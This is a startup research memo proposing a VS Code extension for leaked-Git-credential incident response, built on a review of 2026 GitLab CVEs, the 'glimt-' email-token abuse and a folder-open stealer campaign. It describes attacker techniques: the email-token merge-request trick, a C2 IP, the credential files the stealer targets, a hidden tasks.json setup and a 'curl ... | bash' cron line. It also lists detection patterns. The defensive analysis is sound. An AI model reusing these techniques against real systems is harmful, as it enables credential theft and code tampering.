# GitLab Leaks 2026 → Direction for the Git Extension

**Research date:** 1 November 2026  
**Status:** Research + direction memo. No product code yet.  
**Working name:** Git Blend (to be replaced — see naming section)

---

## 1. Verdict in one paragraph

Do **not** build another secret scanner, reflog timeline, or "undo" UI. Those layers are already free, open source, or shipping inside GitLens/GitLab/GitHub. The 2026 GitLab leaks created a different, unserved problem: **the fix after the finding**. Detection is commodity. History rewriting is commodity. The missing product is the **guided, verifiable incident response** that takes a leaked GitLab/GitHub/cloud credential from "found" to **revoked, rotated, purged, verified, and prevented** — with a safety checkpoint and an audit trail. That is the layer a free clone cannot finish in a weekend, because it depends on provider APIs, sequencing, trust, and accountability.

**Recommended direction:** a VS Code-native **"fix button" for leaked Git credentials** — *Contain → Rotate → Purge → Verify → Prevent* — with a second module that blocks the new class of malicious-repo attacks (`.vscode/tasks.json` folder-open stealers) that ride in on stolen tokens.

---

## 2. What actually happened (the short timeline)

| Date (2026) | Event | Why it matters |
|---|---|---|
| Sep 10 | GitLab patch release fixes **CVE-2026-85706**, CVSS 10.0 path traversal in the repository commits API | Unauthenticated file read; public exploits read `/etc/gitlab/gitlab-secrets.json`, which decrypts CI/CD variables, deploy keys, and integration tokens |
| Sep 11 | CVE-2026-85706 added to CISA KEV; 3-day federal remediation deadline | Active exploitation confirmed |
| Sep 16 | Censys reports **86,231 exposed GitLab servers**; ShadowServer finds ~**13,700 still vulnerable** | The exposed population is huge and slow to patch |
| Sep 23 | Aikido discloses GitLab's **incoming-email token** (`glimt-`) is an account-wide, non-expiring credential | A leaked email address can push code, run CI, read CI variables, bypass IP allow-lists and 2FA |
| Sep 23 | GitLab fixes two CVSS 9.9 authenticated RCEs in the regex compiler (CVE-2026-89078, CVE-2026-93577) | Same researcher, same component, repeated pattern |
| Oct 12 | GitLab fixes **CVE-2026-97229**, CVSS 10.0 unauthenticated RCE via CI/CD regex | Attacker needs only a public project / self-registration; Rapid7 publishes a working PoC |
| Oct 21 | GitLab fixes **CVE-2026-110264**, CVSS 10.0 unauthenticated RCE, affects **every version back to 7.0 (2014)** | The Oct 12 patch did not cover older branches; patch fatigue is real |
| Oct 29 | CVE-2026-97229 added to CISA KEV | Active exploitation confirmed |
| Oct/Nov | **GhostAction / PolinRider** campaign: 72,026 malicious commits across 22,964 repos in nine days | 17,667 repos received a fake font + `.vscode/tasks.json` that runs a credential stealer when the folder is opened |

### The GitLab CVE wave in one table

| CVE | Type | CVSS | Auth | Notes |
|---|---|---:|---|---|
| CVE-2026-85706 | Path traversal / arbitrary file read | 10.0 | None | Reads `gitlab-secrets.json`; KEV; public exploits |
| CVE-2026-97229 | Integer overflow → RCE in CI/CD regex compiler | 10.0 | None | Needs a malicious `.gitlab-ci.yml`; KEV; PoC public |
| CVE-2026-110264 | Integer overflow → RCE in regex compiler | 10.0 | None | Affects 7.0+; four backports; no workaround |
| CVE-2026-87719 | Insecure deserialization (Duo Chat / GraphQL) | 9.9 | Low | Leaks Advanced Search config and credentials |
| CVE-2026-90970 | AI Gateway / Duo flow sandbox escape | 9.9 | Low | Authenticated Duo user → commands on gateway |
| CVE-2026-19478 | GraphQL flaw → delete public repos | 9.4 | None | Exploited within 48 hours |
| CVE-2026-12664 | GraphQL work-item email field access control | 6.8 | Low | `read_api` token can retrieve a project's incoming email address |
| CVE-2026-15723 | SAML/LDAP auto-link account takeover | 8.2 | Low | Requires both enabled |
| CVE-2026-112212 | OAuth/OIDC discovery cache poisoning | 7.5 | None | Shared-cache setups |

**Pattern:** GitLab shipped multiple maximum-severity, network-reachable bugs in weeks, and at least two were exploited in the wild almost immediately. Self-managed instances are the exposed majority. Patching is necessary but does not undo the **secret exposure** that already happened.

---

## 3. The leak economy: why "fix" is the product

### 3.1 Red Hat's consulting GitLab breach (the canonical case)

- **What Red Hat confirmed:** unauthorized access to a GitLab instance used solely for Red Hat Consulting.
- **What attackers claimed:** ~**570 GB** of compressed data from **28,000+ repositories**, affecting ~**800 organizations**; Customer Engagement Reports containing credentials, API keys, database URIs, VPN details, CI/CD configs, and infrastructure topologies.
- **Downstream:** Nissan and Europcar were reported as victims of follow-on access; Belgium's CCB issued a high-risk advisory about leaked authentication tokens.
- **Why it matters:** consulting firms are **credential aggregation points**. One GitLab instance can hold the keys to hundreds of customers. The breach was not just data loss; it was a supply-chain pivot.

> Label: Red Hat confirmed the incident; the 570 GB / 28k / 800 figures are the attackers' claims as reported by GitGuardian and others. Treat them as claims, not audited numbers.

### 3.2 The `glimt-` incoming-email token (the most product-relevant leak)

Aikido's finding, in plain terms:

- GitLab gives every user a private address like  
  `incoming+<project>-<id>-glimt-<token>-issue@incoming.gitlab.com`.
- The `glimt-` token is **the same across all projects**, **never expires**, and is **account-wide**.
- GitLab does **not check the sender**. Anyone with the address is authenticated as the owner.
- Change `-issue` to `-merge-request`, attach a `.patch`, and GitLab commits it as the victim — including to `main` — and runs CI.
- It **bypasses IP allow-lists and 2FA** because it comes in through email.
- It can reach **CI/CD variables, private source, confidential issues, and `CI_JOB_TOKEN`**.
- GitLab.com: the feature cannot be disabled. Self-managed: enabled on many instances. Dedicated: apparently not affected.
- The only fix is **reset** at *User settings → Personal access tokens → Incoming email token*; there is **no bulk revoke** and no admin notification.
- Aikido found **a dozen live addresses published in READMEs and contributing guides** — deliberately, as bug-report addresses.

GitLab's response: closed the HackerOne report as intended behavior, then updated UI/docs to say the address can create merge requests and is not subject to IP restrictions. The underlying mechanism was left intact.

**This is the perfect wedge for a fix product:** the credential looks like an email address, the scanner may not flag it, GitLab's own revocation is a manual reset, and the consequences are code push + CI execution.

### 3.3 Exposed instances and leaked tokens

- **86,231** exposed GitLab hosts (Censys), **~13,700** vulnerable to CVE-2026-85706 (ShadowServer).
- CVE-2026-85706's public exploit reads `/etc/gitlab/gitlab-secrets.json` — the keys used to encrypt CI/CD variables, deploy keys, and integration tokens.
- **GnuTLS near-miss:** Truffle Security found a GitLab PAT with `api` scope and Owner access to 55 projects, including GnuTLS and Nettle. It was published in a public CI artifact for a day; the pipeline had been exposing it since January 11, 2026. A fix landed within hours of disclosure; the token was revoked; no malicious commits found. Had an attacker found it first, it could have pushed to an official GnuTLS release line.

### 3.4 The scale of secrets sprawl

GitGuardian's *State of Secrets Sprawl 2026* (published March 17, 2026; 1.94B public commits scanned):

- **28.65 million** new hardcoded secrets on public GitHub in 2025 — **+34% YoY**, the largest jump in five editions.
- **AI-service secrets:** 1,275,105 detections, **+81% YoY**; 113,000 leaked DeepSeek keys as one example.
- **MCP config files:** 24,008 unique secrets, 2,117 valid.
- **Claude Code-assisted commits:** 3.2% secret-leak rate vs. 1.5% baseline.
- **Internal repos are ~6× more likely** than public repos to contain hardcoded secrets.
- **64% of secrets leaked in 2022 were still valid in January 2026.**
- **46% of critical secrets are missed by validation-only prioritization.**
- **28% of incidents originate outside repos** (Slack, Jira, Confluence), and those are 13 points more likely to be critical.
- **Shai-Hulud 2:** across 6,943 compromised machines, 294,842 secret occurrences / 33,185 unique secrets; **59% were CI/CD runners**, not personal laptops.

**The key number for the product:** 64% still valid years later. Detection is not the bottleneck. **Revocation and rotation are.** That is the fix layer.

---

## 4. The developer endpoint is now the target

GitLab leaks do not stay server-side. Stolen tokens are used to push malicious commits into repos that developers then open.

### GhostAction / PolinRider (October 2026)

- Oct 13–21: **72,026 commits** across **22,964 repositories**, **2,875 owners**, **1,792 pushing accounts**.
- **17,667 repositories** received two files:
  - `public/fonts/fa-solid-400.woff2` — actually a Node.js credential stealer.
  - `.vscode/tasks.json` — a **hidden** task with `"runOn": "folderOpen"` that runs the "font" when the folder is opened in VS Code.
- The task is named `eslint-check`, uses `"hide": true`, `"reveal": "never"`, `"echo": false`, and `"close": true`.
- The stealer reads `~/.aws/credentials`, `.pypirc`, `.npmrc`, `.git-credentials`, `.netrc`, `~/.claude/.credentials.json`, `~/.gemini/oauth_creds.json`, `.kube/config`, SSH keys, and env vars; posts them to `193.32.204.199:8080`.
- It also installs a cron job: `*/5 * * * * curl ... | bash  #ghc2`.
- **Cleaning the repository does not remove the cron job.** The laptop stays owned.
- GitHub's workflow hold does not help: no GitHub Actions workflow is involved. The payload runs on the **developer machine**.
- A related campaign, **PolinRider**, used the same `folderOpen` launcher and a fake font; it targets browser sessions, password vaults, and wallets.

### Other 2026 examples that reinforce the pattern

- **Gheist:** stolen GitHub tokens pushed **13,500 `ci-sync` branches** across **850 accounts**; workflows printed every secret into the run log, then deleted the run.
- **LiteLLM 1.107.0:** a master key committed to a public repo in May became org-owner GitHub tokens, secret-stealing workflows, and a hijacked release in October.
- **Reactime:** 20 of 22 branches carried a folder-open VS Code task stealer.
- **Gitee:** 26,400 working credentials in 7.25 million public repos (9,473 Alibaba Cloud keys, 3,170 DeepSeek, ~1,350 OpenAI).
- **VS Code 1.141.1** fixed ten CVEs, including a profile-import RCE (9.6), terminal-link RCE, and **three Workspace Trust bypasses**. A separate report describes a one-click Workspace Trust bypass that installs an arbitrary extension with no signature or publisher check (MSRC declined a CVE; no fix as of Sept 17).

**Implication:** a Git security product that only scans commits is blind to the execution path. The repo itself is the delivery mechanism, and VS Code is the execution surface. A VS Code extension is uniquely positioned to inspect and block this.

---

## 5. The commoditization check (the WisprFlow lesson)

The user's analogy is correct: WisprFlow's core (dictation) was replicated by free/open-source alternatives (FreeFlow, OpenWhispr, Voquill, VoiceInk, Handy). When the MVP is a feature, the MVP is gone.

Here is the same check for the Git idea:

| Layer | Free/open-source | Platform-native | Verdict |
|---|---|---|---|
| Secret detection | gitleaks, TruffleHog, Betterleaks, Nosey Parker | GitLab Secret Detection (Free+), GitHub secret scanning/push protection, GitGuardian free tier (25 devs) | **Commodity** |
| History rewrite | BFG, git-filter-repo, `git filter-branch` | — | **Commodity** |
| Scan + rewrite in VS Code | **Leak Lock** (MIT, Open VSX **7,455 downloads**, 26 releases, scan + BFG/filter-repo + verify) | — | **Already exists, free** |
| Reflog / undo UI | git-undo, git-time-machine, gitundo | GitLens + built-in SCM; GitLens has an open reflog UI request | **Commodity / crowded** |
| GitLab server patching | — | GitLab patch releases | **Not your product** |
| Secret revocation | Limited: GitLab Ultimate auto-revokes some providers, only public projects, admin toggle; GitGuardian/Aikido are cloud platforms | Provider APIs | **Gap at the local/individual/small-team level** |
| Rotation + dependency update | GitGuardian remediation framework, Aikido auto-fix PRs | — | **Enterprise-only / partial** |
| History purge + force-push + team coordination + verification | Leak Lock does rewrite + verify, but explicitly says "rewriting history does not revoke a working credential" | — | **Gap** |
| Proof / audit trail | Enterprise platforms | — | **Gap for small teams** |
| Repo-open trust gate (folderOpen tasks, hooks, config) | Generic scanners don't cover it; VS Code has Workspace Trust, but it has been bypassed | VS Code Workspace Trust (imperfect) | **Gap** |

**Conclusion:** If the product is "scan + rewrite," Leak Lock already gives it away for free, and GitGuardian/GitLab give away detection. If the product is "undo," GitLens will ship it. The defensible layer is **the fix workflow across systems**, not the finder.

---

## 6. The gap: the last mile of incident response

Existing tools answer: *"Is there a secret?"*  
The missing product answers: *"I leaked a token. What exactly do I do, in what order, and how do I prove it's dead?"*

The workflow that no free tool owns end-to-end:

1. **Contain** — identify the credential, its provider, its scope, and whether it is still live. Revoke it *first*. Purging history before revocation is theater.
2. **Rotate** — issue a new credential, put it in the right place (env var, secret manager, CI variable), update dependencies, and confirm the app still works.
3. **Purge** — rewrite history across every branch, tag, remote-only ref, fork, mirror, wiki, issue, MR comment, CI artifact, and cache. This is destructive; it needs a checkpoint and a dry run.
4. **Verify** — prove the old credential is dead (provider API returns 401), prove every ref is clean, prove CI variables were rotated, and check for unauthorized commits/pipeline runs since exposure.
5. **Prevent** — pre-commit/pre-push guard, custom rules (e.g., `glimt-`, `incoming.gitlab.com`), push protection, `.gitignore`, secret manager wiring, and a repo-open trust check.
6. **Prove** — a timestamped incident report: what leaked, where, blast radius, actions, evidence, residual risk, owner sign-off.

That is a product. It is also a **workflow moat**: each step needs a provider integration, a safety guarantee, or a piece of judgment that a scanner clone does not have.

---

## 7. Recommended direction

### Positioning

> **"Detection tools tell you what leaked. This fixes it."**  
> The VS Code incident-response copilot for leaked Git credentials — local-first, provider-aware, verifiable.

Not "Git security scanner." Not "Git undo." **The fix button for the GitLab leak era.**

### Two modules, one brand

**Module A — Leak Fix (core, MVP)**  
Import a finding from any scanner (gitleaks, TruffleHog, Betterleaks, GitLab/GitHub SARIF, GitGuardian) or detect it locally. Then run the six-step fix workflow with a safety checkpoint, dry runs, and an audit report.

**Module B — Trust Gate (differentiator, phase 2)**  
When a repo is opened, inspect the files that execute before/around the editor:

- `.vscode/tasks.json`: `runOn: folderOpen`, hidden tasks, `shell` commands invoking `node`/`powershell`/`curl`, suspicious labels (`eslint-check`), `"hide": true`.
- "Fonts"/images that are text/JS files; mismatched extensions.
- `.git/hooks/*`, `.git/config` (`core.fsmonitor`, `core.sshCommand`, `core.editor`, `include.path`), `.gitmodules` URLs.
- CI workflows that grep history and POST to an IP (GhostAction pattern).
- Known IOCs (hashes, C2 IPs) and a rules feed.

Warn before the task runs, offer "open in Restricted Mode," quarantine the files, and show a plain-English explanation. This is timely, differentiated, and directly tied to the GitLab leak chain (stolen token → malicious commit → developer opens repo).

> If you must pick one: **Module A** is the business; **Module B** is the hook. Module B alone is a feature VS Code could ship; Module A is a workflow with integrations and liability that is harder to commoditize.

### What the MVP actually does (ship in 6–8 weeks)

**Scope guard:** one repo at a time, six credential types, guided not fully automatic.

1. **Finding intake**
   - Local scan using a bundled open-source engine (do not write a new scanner). Use gitleaks/Betterleaks rules; optionally call TruffleHog for verification.
   - Import SARIF/JSON from GitLab/GitHub/GitGuardian.
   - Manual "I leaked this" flow: paste a token prefix; the extension identifies the type and provider.

2. **Credential playbooks (start with 6)**
   - GitLab PAT (`glpat-`), GitLab incoming-email token (`glimt-` / `incoming.gitlab.com`), GitLab deploy key.
   - GitHub PAT (`ghp_`, `github_pat_`), GitHub App private key.
   - AWS IAM access key.
   - npm token.
   - One AI provider key (OpenAI/Anthropic) because of the 81% AI leak surge.
   - SSH private key.

   Each playbook is YAML:
   ```yaml
   id: gitlab-incoming-email-token
   match: "glimt-[A-Za-z0-9]+"
   provider: gitlab
   severity: critical
   why: "Account-wide, non-expiring token; can push code, run CI, bypass IP allow-lists."
   revoke:
     type: manual
     url: "https://gitlab.com/-/user_settings/personal_access_tokens"
     steps:
       - "User settings → Personal access tokens → Incoming email token → Reset"
       - "This invalidates every project address for the account."
   verify:
     type: manual
     signal: "Old address no longer creates issues/MRs."
   purge:
     required: true
     paths: [".gitlab-ci.yml", "README.md", "docs/"]
   prevent:
     - "Add custom secret-detection rule for glimt-"
     - "Remove the address from README/contributing docs"
   ```

3. **Blast-radius view**
   - From local config: which remotes, CI files, `.env` files, Dockerfiles, and package manifests reference the credential.
   - From provider API (optional, least-privilege): token scopes, accessible projects, last used, recent commits/pipeline runs.
   - Plain English: "This token can push to 14 repos, read 6 CI variables, and impersonate you in 3 groups."

4. **Fix wizard**
   - Step 1: Revoke (deep link or API call). Mark "revoked," "rotation pending," or "unverified."
   - Step 2: Rotate (generate instructions; update `.env`/secret manager; never store the new secret in repo).
   - Step 3: Purge (generate a `git filter-repo` script; dry-run shows commits/branches/tags; create a safety bundle + hidden ref; typed confirmation; rewrite; force-push with `--force-with-lease`; restore branch protection).
   - Step 4: Verify (re-scan all refs; call provider API; list residual copies).
   - Step 5: Prevent (install hooks, add `.gitignore`, add rules, enable push protection).
   - Step 6: Report (Markdown/PDF; timeline, evidence, residual risk, sign-off).

5. **Safety checkpoint (non-negotiable)**
   - Before any rewrite: `git bundle create`, hidden ref (`refs/backup/pre-fix-<timestamp>`), reflog preserved, and a restore button.
   - No automatic force-push. Require the user to read the plan and type the branch name.
   - If unpushed commits exist, stop and list them. Do not discard.
   - If the branch is protected, explain exactly what blocked the push and how to finish safely.

6. **Report**
   - This is the paid/team feature: a signed, timestamped artifact that says what happened, what was revoked, what was rewritten, what remains, and who approved it.

### Phase 2 (after 100+ real fixes)

- Multi-repo / org view.
- Team incident timeline, approvals, and SSO.
- More providers (GCP, Azure, Stripe, Slack, npm, PyPI, Docker Hub, Hugging Face, OpenRouter).
- CI integrations (GitLab CI component, GitHub Action) that run the same playbooks.
- Trust Gate with a rules feed and IOC updates.
- "GitLab instance posture" read-only check via API: version vs. known CVEs, exposed `glimt-` addresses, CI variables older than N days. (Do not become a server scanner; keep it as a lead magnet.)

---

## 8. Why this is harder to clone than a scanner

| Moat | Why a free clone struggles |
|---|---|
| **Provider integrations** | Revocation/rotation APIs, scopes, rate limits, error handling, and verification differ per provider; each is real work and ongoing maintenance |
| **Remediation graph** | Knowing that a GitLab `glimt-` token is account-wide, that a GitHub App key can mint tokens, that an AWS key may have dependent services — this is curated knowledge, not a regex |
| **Safety guarantees** | Checkpoints, dry runs, atomic force-push, protected-branch handling, restore — a bug here destroys work; trust is earned slowly |
| **Audit/accountability** | Teams pay for evidence and sign-off, not for a scan result |
| **Rules/playbook network** | A community-fed library of provider playbooks and IOCs improves with usage |
| **Distribution** | Open VSX + Marketplace + GitLab CI component + content; a clone can copy features but not the installed base or trust |

The WisprFlow lesson applied: **give away the commodity layer** (scanning rules, basic detection, a free single-repo fix) and **charge for the coordination/verification/audit layer**. That is the opposite of trying to defend a feature.

---

## 9. Business model

| Tier | Price | What |
|---|---|---|
| Free | $0 | Local scan/import, single-repo fix wizard, manual playbooks, watermarked report |
| Pro | $8–15/mo or $79–129/yr | Provider API revocation + verification, multi-repo, signed reports, custom rules, CI hooks |
| Team | $10–20/seat/mo | Shared incident timeline, approvals, SSO, policy enforcement, self-managed GitLab support, audit export |
| Services | $99–499/incident | Concierge fix for small teams/agencies (validates the workflow and funds development) |

**Open-source the rules/playbooks** (YAML) to build trust and contributions. Keep the orchestration, provider clients, and audit/reporting proprietary. This is the "commoditize the complement" play.

---

## 10. Go-to-market (first 90 days)

**Wedge content:** *"GitLab's 2026 leak wave: the fix nobody ships."*  
A free, client-side self-check that looks for:
- `glimt-` / `@incoming.gitlab.com` in the working tree and history;
- `glpat-`, `ghp_`, `github_pat_`, AWS keys, npm tokens;
- `.vscode/tasks.json` with `runOn: folderOpen`;
- `.git/config` dangerous keys;
- GitLab version (if the user provides a URL/token) vs. the CVE list.

**Distribution order:**
1. Open VSX first (as with Docker Vitals), then Marketplace once.
2. A GitHub Action / GitLab CI component that runs the same playbooks in CI.
3. A free "GitLab leak checklist" PDF + blog post; target self-managed GitLab admins, consultancies, and agencies.
4. Partner with GitLab-focused MSPs/consultancies — they are the Red Hat-style aggregation points and they feel the pain first.

**Audience:**
- Primary: self-managed GitLab Free/Premium teams that do **not** have Ultimate auto-revocation.
- Secondary: agencies/consultancies handling many client repos.
- Top of funnel: students/indie devs who leaked a key and are panicking (high intent, low willingness to pay; use them for installs and word of mouth).

---

## 11. Two-week validation plan (no code)

1. **Interview 10 self-managed GitLab admins/devs.** Ask: *Have you had a leaked token in the last 12 months? What did you do first? How long did revocation take? Did you rewrite history? Who coordinated it? What did you use?* You are looking for the last-mile pain, not "do you want a scanner."
2. **Concierge 5 fixes.** Manually run the six-step workflow on real repos (with permission). Time each step, record failures, and ask what they would pay to avoid it.
3. **Landing page + self-check.** Measure signups and whether people complete the check. A 20%+ completion rate is a signal.
4. **Competitor teardown.** Install Leak Lock, GitGuardian, GitLab Secret Detection, Aikido. Document exactly where each stops: detection only? rewrite only? revocation? verification? audit? team workflow?
5. **Name/trademark check.** Marketplace, Open VSX, USPTO/EUIPO, npm, GitHub org. Avoid the Git logo/colors and "official" wording.

**Go/no-go:** If 5+ of 10 interviewees describe the fix as painful and 3+ will pay for a concierge fix, build. If they say "our platform does it" or "we just rotate and move on," stop.

---

## 12. Risks and guardrails

| Risk | Guardrail |
|---|---|
| Destructive rewrite destroys work | Bundle + hidden ref + reflog + dry run + typed confirmation + restore button; never auto-force-push |
| "Fixed" but credential still live | Revocation is step 1; verify with provider API; show "unverified" explicitly |
| False sense of security | Never say "secure"; list residual copies (forks, mirrors, CI caches, artifacts, wiki, issues, MR comments) |
| Extension itself becomes a target | Local-first, no secret telemetry, signed/reproducible builds, least-privilege OAuth, open-source the rules |
| Platform ships it | Cross-provider + audit + trust + speed; stay close to self-managed GitLab and agencies |
| Legal/ToS | Clear assistive language, user confirmation, no warranty of completeness; review provider API terms |
| Solo-maintainer trust gap | Open-source the scanner/playbooks, publish test fixtures, show a public incident-response log, get a security review |

---

## 13. What to cut

- **Another generic secret scanner.** Use gitleaks/Betterleaks/TruffleHog.
- **Another reflog/undo UI.** GitLens and free CLI tools own it; it is not the wedge.
- **A GitLab server patcher.** Different buyer, different product, cannot be done from VS Code.
- **Fully automatic rotation for everything.** Too risky; start with guided + verified for six credential types.
- **A SaaS dashboard before the extension works.** Local-first is the trust story.
- **"Git Blend."** It says nothing about the product and invites confusion with GitLens/Git Graph.

---

## 14. Naming

Avoid: Git Blend, Git Safety Net (taken), Git Time Machine (taken), Git Rewind/Git Undo (likely crowded; verify).

Candidate directions (check Marketplace, Open VSX, USPTO, npm, GitHub):
- **Git Triage** — incident-response framing; clear, verb-led, says the outcome.
- **Repo Rescue** — broader than secrets; good for the trust gate too.
- **Contain** — strong security word; may be crowded.
- **Git Aftermath** — memorable, but maybe too dramatic.
- **FixSecrets** — literal, SEO-friendly.

Recommendation: **Git Triage** (selected). Verify npm, Marketplace, Open VSX, GitHub, and USPTO before publishing; use a distinct icon (no orange Git diamond, no GitLab fox).

---

## 15. Sources (verify before publishing)

**GitLab advisories / CVEs**
- GitLab 19.5.1 patch release: https://docs.gitlab.com/releases/patches/patch-release-gitlab-19-5-1-released/
- GitLab 19.3.2 patch release (CVE-2026-85706): https://docs.gitlab.com/releases/patches/patch-release-gitlab-19-3-2-released/
- GitLab 19.4.2 patch release (CVE-2026-97229): https://docs.gitlab.com/releases/patches/patch-release-gitlab-19-4-2-released/
- Rapid7, CVE-2026-85706: https://www.rapid7.com/blog/post/etr-cve-2026-85706-critical-gitlab-path-traversal-exploited-in-the-wild/
- Rapid7, CVE-2026-97229: https://www.rapid7.com/blog/post/etr-cve-2026-97229-critical-unauthenticated-remote-code-execution-in-gitlab/
- The Hacker News, CVE-2026-110264: https://thehackernews.com/2026/10/critical-gitlab-flaw-cvss-100-could.html
- Censys / Cybernews, exposed GitLab servers: https://cybernews.com/security/gitlab-attackers-find-thousands-exposed-servers/

**GitLab leaks / secrets**
- Aikido, "Send GitLab an email, push to main": https://www.aikido.dev/blog/gitlab-email-push-to-main
- GitGuardian, Red Hat GitLab breach: https://blog.gitguardian.com/red-hat-gitlab-breach-the-crimson-collectives-attack/
- Cybernews, GnuTLS token: https://cybernews.com/security/gnutls-exposed-token-supply-chain-attack-averted/
- GitGuardian, State of Secrets Sprawl 2026: https://blog.gitguardian.com/the-state-of-secrets-sprawl-2026/
- GitLab Secret Detection automatic response (Ultimate): https://docs.gitlab.com/user/application_security/secret_detection/automatic_response/

**Supply chain / developer endpoint**
- GitGuardian, GhostAction x PolinRider: https://blog.gitguardian.com/ghostaction-x-polinrider/
- Vibe Coding Security advisories index (Gheist, LiteLLM, Reactime, VS Code CVEs): https://pranava0x0.github.io/vibe-coding-security/advisories/
- Leak Lock (competitor): https://nikolareljin.github.io/leak-lock/
- Open VSX API for Leak Lock downloads: https://open-vsx.org/api/nikolareljin/leak-lock

**WisprFlow context**
- Open-source alternatives: https://openalternative.co/alternatives/wisprflow
- FreeFlow: https://github.com/zachlatta/freeflow

---

## 16. One-sentence direction

**Build the fix layer for leaked Git credentials — a VS Code-native incident-response copilot that takes any finding through revoke → rotate → purge → verify → prevent, with a safety checkpoint and an audit trail — and treat scanning, reflog UIs, and history rewriting as commodity inputs, not the product.**
